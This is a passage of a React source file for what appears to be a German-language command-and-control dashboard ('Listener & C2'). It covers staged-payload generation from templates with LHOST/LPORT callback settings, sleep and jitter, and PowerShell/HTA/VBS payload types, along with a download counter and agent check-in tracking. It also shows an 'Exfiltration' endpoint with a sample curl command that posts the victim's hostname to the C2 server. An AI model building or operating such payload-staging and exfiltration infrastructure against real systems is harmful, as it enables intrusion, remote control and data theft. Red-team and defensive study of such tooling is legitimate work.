            <button onClick={() => { setShowManual(!showManual); setShowGenerator(false); }} className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-300 text-sm">
              <FileCode size={14} /> Manuell erstellen
            </button>
          </div>
        )}
      </div>

      {/* Template Generator */}
      {showGenerator && selectedLid && (
        <div className="bg-slate-800 border border-indigo-600/30 rounded-xl p-5 space-y-4">
          <h3 className="text-white font-semibold text-sm flex items-center gap-2"><Zap size={16} className="text-amber-400" /> Payload aus Template generieren</h3>

          {/* Template Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
            {templates.map(tpl => (
              <div
                key={tpl.id}
                onClick={() => handleTemplateSelect(tpl.id)}
                className={`rounded-lg border p-3 cursor-pointer transition-all ${selectedTemplate === tpl.id ? 'border-indigo-500 bg-indigo-600/10' : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'}`}
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="text-white text-sm font-medium">{tpl.name}</span>
                  <span className={`px-1.5 py-0.5 rounded text-[10px] font-medium border ${PLATFORM_COLORS[tpl.platform] ?? 'text-slate-400 bg-slate-700'}`}>{tpl.platform}</span>
                </div>
                <p className="text-xs text-slate-500 line-clamp-2">{tpl.description}</p>
                <div className="flex items-center gap-2 mt-2">
                  <span className="px-1.5 py-0.5 rounded text-[10px] bg-slate-700 text-slate-400">{tpl.payload_type}</span>
                  <span className="text-[10px] text-slate-600 font-mono">{tpl.default_stage_path}</span>
                </div>
              </div>
            ))}
          </div>

          {/* Parameters */}
          {curTpl && (
            <div className="space-y-3 border-t border-slate-700 pt-4">
              <h4 className="text-slate-300 text-sm font-medium">Parameter konfigurieren</h4>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                <div>
                  <label className="text-[10px] text-slate-500 uppercase tracking-wider mb-1 block">LHOST (Callback-IP)</label>
                  <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full" placeholder="10.0.0.1" value={tplParams.LHOST} onChange={e => setTplParams({ ...tplParams, LHOST: e.target.value })} />
                </div>
                <div>
                  <label className="text-[10px] text-slate-500 uppercase tracking-wider mb-1 block">LPORT</label>
                  <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full" type="number" placeholder="8080" value={tplParams.LPORT} onChange={e => setTplParams({ ...tplParams, LPORT: e.target.value })} />
                </div>
                {curTpl.params.includes('SLEEP') && (
                  <div>
                    <label className="text-[10px] text-slate-500 uppercase tracking-wider mb-1 block">Sleep (Sek.)</label>
                    <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full" type="number" value={tplParams.SLEEP} onChange={e => setTplParams({ ...tplParams, SLEEP: e.target.value })} />
                  </div>
                )}
                {curTpl.params.includes('JITTER') && (
                  <div>
                    <label className="text-[10px] text-slate-500 uppercase tracking-wider mb-1 block">Jitter (%)</label>
                    <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full" type="number" value={tplParams.JITTER} onChange={e => setTplParams({ ...tplParams, JITTER: e.target.value })} />
                  </div>
                )}
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div>
                  <label className="text-[10px] text-slate-500 uppercase tracking-wider mb-1 block">Stage-Pfad</label>
                  <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full font-mono" value={tplParams.STAGE_PATH} onChange={e => setTplParams({ ...tplParams, STAGE_PATH: e.target.value })} />
                </div>
                {curTpl.params.includes('STAGE_PATH') && (
                  <div>
                    <label className="text-[10px] text-slate-500 uppercase tracking-wider mb-1 block">Stager-URL</label>
                    <div className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-400 font-mono truncate">
                      {selectedListener?.listener_type}://{tplParams.LHOST || '?'}:{tplParams.LPORT || '?'}{tplParams.STAGE_PATH}
                    </div>
                  </div>
                )}
              </div>

              {/* Preview / Deploy buttons */}
              <div className="flex items-center gap-3 pt-2">
                <button onClick={handlePreview} disabled={generating || !tplParams.LHOST} className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-300 text-sm disabled:opacity-40">
                  {previewVisible ? <EyeOff size={14} /> : <Eye size={14} />} Vorschau
                </button>
                <button onClick={handleDeploy} disabled={generating || !tplParams.LHOST} className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-sm font-medium disabled:opacity-40">
                  <Download size={14} /> {generating ? 'Generiere...' : 'Generieren & Deployen'}
                </button>
                <button onClick={() => setShowGenerator(false)} className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-sm">Abbrechen</button>
              </div>

              {/* Preview panel */}
              {previewVisible && preview && (
                <div className="border border-slate-700 rounded-lg overflow-hidden">
                  <div className="flex items-center justify-between px-4 py-2 bg-slate-900/50 border-b border-slate-700">
                    <span className="text-xs text-slate-400">Vorschau: {preview.name} ({preview.payload_type})</span>
                    <CopyBtn text={preview.content} />
                  </div>
                  <pre className="px-4 py-3 text-xs text-slate-300 font-mono overflow-auto max-h-[300px] whitespace-pre-wrap bg-slate-950/50">{preview.content}</pre>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* Manual Create (collapsed by default) */}
      {showManual && selectedLid && (
        <div className="bg-slate-800 border border-slate-700 rounded-xl p-5 space-y-3">
          <h3 className="text-white font-semibold text-sm flex items-center gap-2"><FileCode size={16} className="text-slate-400" /> Manuelles Staged Payload</h3>
          <div className="grid grid-cols-3 gap-3">
            <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="Name" value={manualForm.name} onChange={e => setManualForm({ ...manualForm, name: e.target.value })} />
            <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="/stage/payload.ps1" value={manualForm.stage_path} onChange={e => setManualForm({ ...manualForm, stage_path: e.target.value })} />
            <select className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white" value={manualForm.payload_type} onChange={e => setManualForm({ ...manualForm, payload_type: e.target.value })}>
              <option value="raw">Raw</option><option value="ps1">PowerShell</option><option value="bat">Batch</option><option value="vbs">VBScript</option><option value="hta">HTA</option><option value="py">Python</option><option value="sh">Bash</option>
            </select>
          </div>
          <textarea className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full h-32 font-mono" placeholder="Payload-Inhalt..." value={manualForm.content} onChange={e => setManualForm({ ...manualForm, content: e.target.value })} />
          <div className="flex justify-end gap-2">
            <button onClick={() => setShowManual(false)} className="px-3 py-1.5 rounded-lg bg-slate-700 text-slate-300 text-sm">Abbrechen</button>
            <button onClick={handleManualCreate} className="px-3 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-sm font-medium">Erstellen</button>
          </div>
        </div>
      )}

      {/* Existing payloads list */}
      {payloads.length === 0 && selectedLid && !loading && <div className="text-center py-8 text-slate-500 text-sm">Keine Staged Payloads für diesen Listener.</div>}
      <div className="space-y-2">
        {payloads.map(sp => (
          <div key={sp.id} className="bg-slate-800/60 border border-slate-700 rounded-lg px-4 py-3 flex items-center justify-between">
            <div>
              <div className="flex items-center gap-2">
                <Zap size={14} className="text-amber-400" /><span className="text-white text-sm font-medium">{sp.name}</span>
                <span className={`px-1.5 py-0.5 rounded text-xs ${sp.is_active ? 'bg-emerald-400/15 text-emerald-400' : 'bg-slate-700 text-slate-500'}`}>{sp.is_active ? 'aktiv' : 'inaktiv'}</span>
              </div>
              <div className="text-xs text-slate-500 mt-1 flex items-center gap-3">
                <span className="font-mono">{sp.stage_path}</span><CopyBtn text={selectedListener ? `${selectedListener.listener_type}://${tplParams.LHOST || selectedListener.bind_address}:${selectedListener.bind_port}${sp.stage_path}` : sp.stage_path} />
                <span>{sp.payload_type}</span><span>{sp.download_count} Downloads</span>
              </div>
            </div>
            <button onClick={() => { if (confirm('Staged Payload löschen?') && selectedLid) deleteStagedPayload(selectedLid, sp.id).then(() => refreshPayloads()); }} className="p-1.5 rounded hover:bg-rose-500/20 text-rose-400"><Trash2 size={14} /></button>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════════════
   Legacy Events Tab
   ═══════════════════════════════════════════════════════════════════════ */

const LEGACY_BASE = window.location.origin;
const LEGACY_EPS = [
  { label: 'Check-in', icon: Wifi, color: 'text-emerald-400', bg: 'bg-emerald-400/10 border-emerald-400/30', url: `${LEGACY_BASE}/api/l/checkin/<identifier>`, curl: `curl -X POST ${LEGACY_BASE}/api/l/checkin/payload_v1`, desc: 'Empfängt GET/POST Check-ins von Remote-Payloads.' },
  { label: 'Exfiltration', icon: Database, color: 'text-rose-400', bg: 'bg-rose-400/10 border-rose-400/30', url: `${LEGACY_BASE}/api/l/exfil/<label>`, curl: `curl -X POST ${LEGACY_BASE}/api/l/exfil/host -d "$(hostname)"`, desc: 'Empfängt kleine Datenpakete (Hostname, whoami, etc.).' },
];
const ACTION_STYLES: Record<string, string> = { payload_checkin: 'bg-emerald-400/10 text-emerald-400 border border-emerald-400/30', data_exfil: 'bg-rose-400/10 text-rose-400 border border-rose-400/30' };

function LegacyTab() {
  const [events, setEvents] = useState<LegacyEvent[]>([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [pages, setPages] = useState(1);
  const [loading, setLoading] = useState(false);

  const fetchEvents = useCallback(async (p = 1) => {
    setLoading(true);
    try { const res = await api.get<LegacyEventsResponse>('/l/events', { params: { page: p, per_page: 25 } }); setEvents(res.data.events); setTotal(res.data.total); setPages(res.data.pages); setPage(res.data.current_page); }
    catch { /* ignore */ }
    finally { setLoading(false); }
  }, []);

  useEffect(() => { fetchEvents(); const i = setInterval(() => fetchEvents(), 10_000); return () => clearInterval(i); }, [fetchEvents]);

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {LEGACY_EPS.map(ep => {
          const Icon = ep.icon;
          return (
            <div key={ep.label} className={`rounded-xl border p-5 space-y-3 ${ep.bg}`}>
              <div className="flex items-center gap-2"><Icon size={18} className={ep.color} /><span className={`font-semibold ${ep.color}`}>{ep.label}</span></div>
              <p className="text-slate-300 text-sm">{ep.desc}</p>
              <div><p className="text-xs text-slate-500 mb-1 uppercase tracking-wide">Endpoint</p><div className="flex items-center gap-2 bg-slate-900/60 rounded-lg px-3 py-2"><code className="text-xs text-slate-300 flex-1 break-all">{ep.url}</code><CopyBtn text={ep.url} /></div></div>
              <div><p className="text-xs text-slate-500 mb-1 uppercase tracking-wide">curl Beispiel</p><div className="flex items-center gap-2 bg-slate-900/60 rounded-lg px-3 py-2"><code className="text-xs text-slate-300 flex-1 break-all">{ep.curl}</code><CopyBtn text={ep.curl} /></div></div>
            </div>
          );
        })}
      </div>

      <div className="rounded-xl border border-slate-700 bg-slate-800/50">
        <div className="flex items-center justify-between px-5 py-3 border-b border-slate-700">
          <h2 className="font-semibold text-white text-sm">Legacy Events <span className="text-slate-400 font-normal">({total})</span></h2>
          <button onClick={() => fetchEvents(page)} disabled={loading} className="p-1 rounded hover:bg-slate-700"><RefreshCw size={14} className={loading ? 'animate-spin text-slate-400' : 'text-slate-500'} /></button>
        </div>
        {events.length === 0 && !loading && <div className="px-5 py-8 text-center text-slate-500 text-sm">Noch keine Events.</div>}
        {events.length > 0 && (
          <div className="overflow-x-auto">
            <table className="w-full text-xs">
              <thead><tr className="text-left text-slate-500 border-b border-slate-700"><th className="px-5 py-2 font-medium">Aktion</th><th className="px-5 py-2 font-medium">Ziel</th><th className="px-5 py-2 font-medium">IP</th><th className="px-5 py-2 font-medium">Details</th><th className="px-5 py-2 font-medium">Zeit</th></tr></thead>
              <tbody>
                {events.map(ev => (
                  <tr key={ev.id} className="border-b border-slate-700/50 hover:bg-slate-700/30">
                    <td className="px-5 py-2"><span className={`px-2 py-0.5 rounded text-xs font-medium ${ACTION_STYLES[ev.action] ?? 'bg-slate-700 text-slate-300'}`}>{ev.action}</span></td>
                    <td className="px-5 py-2 text-slate-300 font-mono">{ev.target}</td>
                    <td className="px-5 py-2 text-slate-400 font-mono">{ev.ip_address ?? '—'}</td>
                    <td className="px-5 py-2 text-slate-400 max-w-xs truncate" title={ev.details}>{ev.details}</td>
                    <td className="px-5 py-2 text-slate-500 whitespace-nowrap">{new Date(ev.timestamp).toLocaleString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
        {pages > 1 && (
          <div className="flex items-center justify-center gap-2 py-3 border-t border-slate-700">
            <button disabled={page <= 1} onClick={() => fetchEvents(page - 1)} className="px-3 py-1 rounded bg-slate-700 text-slate-300 text-xs disabled:opacity-40">← Zurück</button>
            <span className="text-xs text-slate-500">Seite {page} / {pages}</span>
            <button disabled={page >= pages} onClick={() => fetchEvents(page + 1)} className="px-3 py-1 rounded bg-slate-700 text-slate-300 text-xs disabled:opacity-40">Weiter →</button>
          </div>
        )}
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════════════
   Main Component
   ═══════════════════════════════════════════════════════════════════════ */

export default function Listener() {
  const [tab, setTab] = useState<Tab>('listeners');

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-3">
        <Radio className="text-indigo-400" size={28} />
        <div>
          <h1 className="text-2xl font-bold text-white">Listener & C2</h1>
          <p className="text-slate-400 text-sm">Listener-Verwaltung · Agent-Management · Callback-Tracking</p>
        </div>
      </div>

      <div className="flex gap-1 bg-slate-800/50 rounded-lg p-1 border border-slate-700">
        {TABS.map(t => {
          const Icon = t.Icon;
          const active = tab === t.key;
          return (
            <button key={t.key} onClick={() => setTab(t.key)} className={`flex items-center gap-1.5 px-3 py-2 rounded-md text-sm font-medium transition-all ${active ? 'bg-indigo-600/20 text-indigo-400 border border-indigo-600/30' : 'text-slate-400 hover:text-slate-200 hover:bg-slate-700/50'}`}>
              <Icon size={14} />{t.label}
            </button>
          );
        })}
      </div>

      {tab === 'listeners' && <ListenersTab />}
      {tab === 'agents' && <AgentsTab />}
      {tab === 'callbacks' && <CallbacksTab />}
      {tab === 'staged' && <StagedTab />}
      {tab === 'legacy' && <LegacyTab />}
    </div>
  );
}
